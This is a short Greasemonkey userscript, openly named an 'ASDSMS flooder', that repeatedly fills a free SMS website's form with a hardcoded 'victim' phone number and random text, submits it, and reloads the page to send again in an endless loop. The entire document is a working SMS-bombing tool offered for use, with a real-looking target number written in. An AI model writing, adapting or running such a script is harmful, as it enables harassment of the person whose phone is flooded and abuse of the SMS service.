// ==UserScript==
// @name                    ASDSMS  flooder BY SUNNY020
// @namespace           SUNNY020
// @description            flooder sms
// @include                 http://*asdsms.com/*
// ==/UserScript==

var victim=8092262928; //Enter victims number here
var delay=0; // Enter delay in milliseconds if required
var msg="flooding";

if(document.location=="http://asdsms.com/inner.html"||document.location=="http://www.asdsms.com/inner.html")
{
document.getElementById('mobile').value=victim;
document.forms[0].elements[1].value=Math.floor(Math.random()*1456484)+'\n'+msg+Math.floor(Math.random()*1456484);
void(0);
document.getElementsByTagName("input")[4].click();;
}

if(document.location=="http://asdsms.com/sendsms.php"||document.location=="http://www.asdsms.com/sendsms.php")
{
setTimeout('document.location="http://asdsms.com/inner.html"',delay);
}